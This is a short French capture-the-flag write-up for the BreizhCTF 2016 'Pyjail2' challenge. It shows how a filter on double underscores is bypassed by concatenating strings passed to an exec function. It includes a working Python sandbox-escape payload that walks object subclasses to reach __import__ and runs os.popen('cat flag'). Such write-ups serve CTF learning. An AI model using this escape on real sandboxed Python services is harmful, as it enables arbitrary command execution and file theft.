# BREIZHCTF 2K16
** Chall:** Pyjail2
**Points:** 200 |
**Taux de réussite:** 14% |


Pour ce deuxième chall de pyjail on reste dans la même idée que le premier : sortir du "jail".Par contre on remarque que le double underscore n'est plus accepté par le programme comme entrée :/ 

Ayant récupérer le code du premier chall on remarque qu'il existe une fonction "_" qui prend en paramètre une chaine de caractères et qui exécute le code reçu (intéressant !).

L'idée est la suivante, nous allons exécuter les mêmes commandes qu'avant (pyjail1) sauf que cette fois ci on les passera à la fonction "\_" en tant que chaine de caractères.
Donc, on peut passer des commandes avec un double underscore dedans, il suffit simplement de concaténer deux underscore \("\__" =>\ \:\(\  , "\_"+"\_" => \:\) \).

```
>_("wclass = ()._"+"_class_"+"_._"+"_base_"+"_._"+"_subclasses_"+"_()[59]()")
>_("print wclass._module._"+"_builtins_"+"_['_"+"_import_"+"_']('os').popen('cat flag')").read()

BZH{fugitif 2 \o/}
```
PS:  j'ai encore oublié de copier le flag :p

De même on exécute une commande pour récupérer le code du chall "cat python\_vm2.py".
